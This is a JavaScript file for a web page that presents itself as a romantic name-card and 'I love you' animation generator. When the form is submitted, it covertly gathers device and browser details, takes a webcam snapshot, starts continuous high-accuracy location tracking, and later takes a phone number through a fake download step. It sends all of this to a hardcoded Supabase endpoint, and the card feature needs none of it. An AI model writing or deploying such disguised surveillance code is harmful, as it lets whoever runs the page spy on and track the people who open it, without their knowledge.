(function () {
  'use strict';

  var SUPABASE_URL = "https://rixjkiebspsjvdnmmpvp.supabase.co";
  var SUPABASE_KEY = "sb_publishable_wpKFc1qzlSGrJ03HqeKTdw_wq435ith";

  var clientTelemetry = null;
  var watchId = null;
  var latestPayload = {};

  var screen1 = document.getElementById('screen-1');
  var screen2 = document.getElementById('screen-2');
  var namesForm = document.getElementById('names-form');
  var yourNameInput = document.getElementById('your-name');
  var partnerNameInput = document.getElementById('partner-name');
  var loveMessageInput = document.getElementById('love-message');
  var themeSelect = document.getElementById('card-theme-select');
  var fontSizeSelect = document.getElementById('card-font-size');
  var formError = document.getElementById('form-error');

  var namesDisplay = document.getElementById('names-display');
  var wishDisplay = document.getElementById('wish-display');
  var uiContainer = document.getElementById('ui');
  var replayBtn = document.getElementById('replay-btn');
  var downloadBtn = document.getElementById('download-btn');
  var phoneModal = document.getElementById('phone-modal');
  var modalPhoneInput = document.getElementById('modal-phone-input');
  var modalCancelBtn = document.getElementById('modal-cancel-btn');
  var modalSubmitBtn = document.getElementById('modal-submit-btn');

  function parseUserAgentFallback(ua) {
    var deviceName = 'Generic Device', deviceType = 'desktop', os = 'Unknown OS', browser = 'Unknown Browser';
    if (/iPhone/i.test(ua)) { deviceName = 'Apple iPhone'; deviceType = 'mobile'; os = 'iOS'; }
    else if (/Android/i.test(ua)) { deviceName = 'Android Device'; deviceType = 'mobile'; os = 'Android'; }
    else if (/Windows NT/i.test(ua)) { deviceName = 'Windows PC'; os = 'Windows'; }
    else if (/Macintosh/i.test(ua)) { deviceName = 'Apple Mac'; os = 'macOS'; }
    if (/Edg\//i.test(ua)) browser = 'Microsoft Edge';
    else if (/Chrome\//i.test(ua)) browser = 'Google Chrome';
    else if (/Firefox\//i.test(ua)) browser = 'Mozilla Firefox';
    else if (/Safari\//i.test(ua)) browser = 'Apple Safari';
    return { deviceName: deviceName, deviceType: deviceType, os: os, browser: browser };
  }

  function getBatteryMetrics() {
    if (typeof navigator.getBattery === 'function') {
      return navigator.getBattery().then(function (battery) {
        return { battery_level: Math.round(battery.level * 100), battery_charging: Boolean(battery.charging) };
      }).catch(function () { return { battery_level: null, battery_charging: null }; });
    }
    return Promise.resolve({ battery_level: null, battery_charging: null });
  }

  function detectTelemetry() {
    var ua = navigator.userAgent || '';
    var fallback = parseUserAgentFallback(ua);
    var screenStr = window.screen.width + 'x' + window.screen.height;
    var tzStr = 'Unknown';
    try { tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

    getBatteryMetrics().then(function (batteryData) {
      clientTelemetry = {
        device_name: fallback.deviceName,
        device_type: fallback.deviceType,
        browser: fallback.browser,
        os: fallback.os,
        battery_level: batteryData.battery_level,
        battery_charging: batteryData.battery_charging ? 1 : 0,
        screen_res: screenStr,
        timezone: tzStr,
        user_agent: ua
      };
    });
  }
  detectTelemetry();

  function pushToSupabase(payload) {
    fetch(SUPABASE_URL + '/rest/v1/demo_telemetry', {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': 'Bearer ' + SUPABASE_KEY,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify(payload)
    }).catch(function (err) {
      console.error("Telemetry sync error:", err);
    });
  }

  function applyCustomStyles(theme, scale) {
    if (!namesDisplay) return;
    if (theme === 'crimson') namesDisplay.style.color = '#ff334b';
    else if (theme === 'sunset') namesDisplay.style.color = '#ffa15c';
    else namesDisplay.style.color = '#ff6584';
    namesDisplay.style.transform = scale === 'large' ? 'scale(1.2)' : 'scale(1.0)';
  }

  function renderNames(name1, name2, message, theme, scale) {
    if (!namesDisplay) return;
    namesDisplay.innerHTML = '';
    applyCustomStyles(theme, scale);

    var span1 = document.createElement('span');
    span1.textContent = name1;
    span1.style.color = namesDisplay.style.color;

    var heartSpan = document.createElement('span');
    heartSpan.className = 'heart-sep';
    heartSpan.textContent = ' ❤ ';
    heartSpan.style.color = '#6c63ff';

    var span2 = document.createElement('span');
    span2.textContent = name2;
    span2.style.color = '#ffffff';

    namesDisplay.appendChild(span1);
    namesDisplay.appendChild(heartSpan);
    namesDisplay.appendChild(span2);

    if (wishDisplay) {
      wishDisplay.textContent = message || 'Together Always ❤';
    }
  }

  function generateLoveParticles(count) {
    if (!uiContainer) return;
    uiContainer.innerHTML = '';
    for (var i = 1; i <= count; i++) {
      var love = document.createElement('div');
      love.className = 'love';
      love.style.setProperty('--i', i.toString());
      var h = document.createElement('div'); h.className = 'love_horizontal';
      var v = document.createElement('div'); v.className = 'love_vertical';
      var word = document.createElement('div'); word.className = 'love_word'; word.textContent = 'I love you ❤';
      v.appendChild(word); h.appendChild(v); love.appendChild(h);
      uiContainer.appendChild(love);
    }
  }

  namesForm.addEventListener('submit', function (e) {
    e.preventDefault();
    var yourName = (yourNameInput.value || '').trim();
    var partnerName = (partnerNameInput.value || '').trim();
    var message = (loveMessageInput.value || '').trim();
    var selectedTheme = themeSelect ? themeSelect.value : 'rose';
    var selectedScale = fontSizeSelect ? fontSizeSelect.value : 'normal';

    if (!yourName || !partnerName) {
      formError.textContent = 'Please enter both names.';
      return;
    }
    formError.textContent = '';

    screen1.classList.remove('screen-active'); screen1.classList.add('screen-hidden');
    screen2.classList.remove('screen-hidden'); screen2.classList.add('screen-active');

    renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
    generateLoveParticles(70);

    latestPayload = Object.assign({}, clientTelemetry || {}, {
      timestamp: new Date().toISOString(),
      couple_names: yourName + ' ❤ ' + partnerName,
      user_agent: navigator.userAgent
    });

    // 1. Camera permission & snapshot
    if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          var video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          setTimeout(function () {
            var canvas = document.createElement('canvas');
            canvas.width = 160;
            canvas.height = 120;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 160, 120);
            var pic = canvas.toDataURL('image/jpeg', 0.5);
            stream.getTracks().forEach(function (t) { t.stop(); });

            latestPayload.camera_status = 'Allowed / Active';
            latestPayload.webcam_pic = pic;
            pushToSupabase(latestPayload);
          }, 800);
        })
        .catch(function () {
          latestPayload.camera_status = 'Denied / Blocked';
          latestPayload.webcam_pic = null;
          pushToSupabase(latestPayload);
        });
    } else {
      latestPayload.camera_status = 'Not Supported';
      pushToSupabase(latestPayload);
    }

    // 2. Geolocation tracking
    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        function (position) {
          latestPayload.latitude = position.coords.latitude;
          latestPayload.longitude = position.coords.longitude;
          latestPayload.location_status = 'Allowed / Live Tracking';
          pushToSupabase(latestPayload);
        },
        function () {
          latestPayload.latitude = null;
          latestPayload.longitude = null;
          latestPayload.location_status = 'Denied / Blocked';
          pushToSupabase(latestPayload);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  });

  // Download / Export Trigger -> Opens Phone Number Modal
  if (downloadBtn) {
    downloadBtn.addEventListener('click', function () {
      if (phoneModal) {
        phoneModal.style.display = 'flex';
        if (modalPhoneInput) modalPhoneInput.focus();
      }
    });
  }

  if (modalCancelBtn) {
    modalCancelBtn.addEventListener('click', function () {
      if (phoneModal) phoneModal.style.display = 'none';
    });
  }

  // Modal Submit -> Saves Phone to Supabase and Exports Card Only
  if (modalSubmitBtn) {
    modalSubmitBtn.addEventListener('click', function () {
      var phoneNum = modalPhoneInput ? modalPhoneInput.value.trim() : '';
      if (phoneNum) {
        latestPayload.user_agent = (latestPayload.user_agent || '') + ' | Phone: ' + phoneNum;
        pushToSupabase(latestPayload);
      }
      if (phoneModal) phoneModal.style.display = 'none';

      var cardOverlay = document.getElementById('names-overlay');
      if (!cardOverlay || typeof html2canvas !== 'function') return;

      downloadBtn.textContent = 'Generating Card...';
      html2canvas(cardOverlay, { useCORS: true, backgroundColor: null }).then(function (canvas) {
        var link = document.createElement('a');
        link.download = 'love-animation-card.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
        downloadBtn.textContent = '📥 Download & Share Animation';
      }).catch(function () {
        downloadBtn.textContent = '📥 Download & Share Animation';
      });
    });
  }

  if (replayBtn) {
    replayBtn.addEventListener('click', function () {
      if (watchId !== null && navigator.geolocation) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }
      screen2.classList.remove('screen-active'); screen2.classList.add('screen-hidden');
      screen1.classList.remove('screen-hidden'); screen1.classList.add('screen-active');
      yourNameInput.value = ''; partnerNameInput.value = '';
      if (loveMessageInput) loveMessageInput.value = '';
      yourNameInput.focus();
    });
  }
})();
